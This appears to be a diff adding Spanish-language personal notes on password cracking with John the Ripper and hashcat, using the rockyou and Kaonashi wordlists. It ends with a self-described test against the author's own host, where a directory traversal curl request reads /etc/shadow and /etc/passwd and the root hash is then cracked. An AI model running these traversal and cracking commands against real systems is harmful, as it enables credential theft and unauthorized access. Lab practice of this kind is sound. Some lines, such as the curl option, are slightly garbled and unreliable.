@@ -1,0 +1,97 @@
+### 🎩 1º forma - rockyou.txt
+---------------------------------------------------------------------------------------------------
+# descargo el dicionario rockyou.txt
+apt install wget -y
+cd /aptelliot
+wget rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+# compruebo la contraseña contra el archivo rockyou.txt
+grep -Fx "123456" rockyou.txt && echo "Comprometida" || echo "No encontrada"
+
+## jonh
+# instalo jonh
+sudo apt install john -y
+
+# otra forma pero codificado
+touch /hash.txt
+echo -n "password123" | md5sum
+  # 482c811da5d5b4bc6d497ffa98491e38
+echo "482c811da5d5b4bc6d497ffa98491e38" > /hash.txt
+echo "5f4dcc3b5aa765d61d8327deb882cf99" > /hash.txt
+
+# descifrar
+# john --format=md5crypt --wordlist=/aptelliot/pruebas/rockyou.txt /aptelliot/pruebas/hash.txt
+john --wordlist=/aptelliot/pruebas/rockyou.txt /aptelliot/pruebas/hash.txt
+
+# muestra las contraseñas que John the Ripper ha descifrado exitosamente
+john --show hashes.txt
+---------------------------------------------------------------------------------------------------
+
+### 🎩 2º forma (más efectiva) - ガ kaonashi.txt
+---------------------------------------------------------------------------------------------------
+# instalo john compilado
+sudo apt update
+sudo apt install john -y 
+cd run/bin/
+git clone https://github.com/openwall/john.git
+cd john/src
+./configure && make -s clean && make -sj4
+cd ~
+vim .bashrc
+------------------------------------------------------------
+...
+alias john="/run/bin/john/run/john"
+...
+------------------------------------------------------------
+
+Kaonashi.txt
+https://github.com/kaonashi-passwords/Kaonashi
+
+# desde windows envio el archivo al servidor
+scp .\kaonashi.7z user@ip:/aptelliot/pruebas
+
+# instalo en el servidor 7zip para descomprimirlo
+sudo apt install p7zip-full
+7z x kaonashi.7z
+
+# ejecuto el archivo con hascat o jonh...etc
+# hashcat -m 0 -a 0 /aptelliot/pruebas/hash.txt /aptelliot/pruebas/kaonashi.txt
+# utilizo jonh según el formato
+john --wordlist=/aptelliot/pruebas/kaonashi.txt --format=descrypt /aptelliot/pruebas/hash.txt
+john --wordlist=/aptelliot/pruebas/kaonashi.txt --format=md5crypt /aptelliot/pruebas/hash.txt
+john --session=yescrypt_run --wordlist=/aptelliot/pruebas/kaonashi.txt --rules --format=crypt /aptelliot/pruebas/hash.txt
+john --wordlist=/aptelliot/pruebas/kaonashi.txt --format=raw-sha256 /aptelliot/pruebas/hash.txt
+john --wordlist=/aptelliot/pruebas/kaonashi.txt --format=sha512crypt /aptelliot/pruebas/hash.txt
+
+# si no funciona a la primera puedo probar con reglas, agregando el encriptado necesario (con esta forma tarda muchísimo más...)
+# las reglas lo que va hacer es modificar automáticamente las palabras de tu wordlist y generar variantes que podrían coincidir con la contraseña real (intenta agrega números al final y al principio de las contraseñas... etc )
+john --wordlist=/aptelliot/pruebas/kaonashi.txt --rules --format=raw-sha256 /aptelliot/pruebas/hash.txt
+---------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+===================================================================================================
+===================================================================================================
+
+[ejemplo a un hackeao a mi mismo de ejmplo]:
+# este equipo tiene la vulnerabilidad de Directory Traversal
+# conozco las contraseñas
+curl --pathcurl --path-as-is --http0.9 http://10.1.81.41:8080/../../../../../../etc/shadow
+
+# conozco los usuarios
+curl --pathcurl --path-as-is --http0.9 http://10.1.81.41:8080/../../../../../../etc/passwd
+
+# agrego la contraseña impresa de shadow de root (solo la parte necesaria del hash, sin los parámetros de la identificación del tipo de hash)
+root:$1$imX0rHTE$U6/pddsfdgfIdsfgds3vT.:10933:0:99999:7:::
+vim /aptelliot/pruebas/hash.txt
+-------------------------------------------
+$1$imX0rHTE$U6/pddsfdgfIdsfgds3vT.
+-------------------------------------------
+
+# descargo kaonashi, lo descomprimo y lo guardo en /aptelliot/pruebas/kaonashi.txt
+# decodifico la contraseña del usuario root con kaonashi
+john --wordlist=/aptelliot/pruebas/kaonashi.txt --format=md5crypt /aptelliot/pruebas/hash.txt
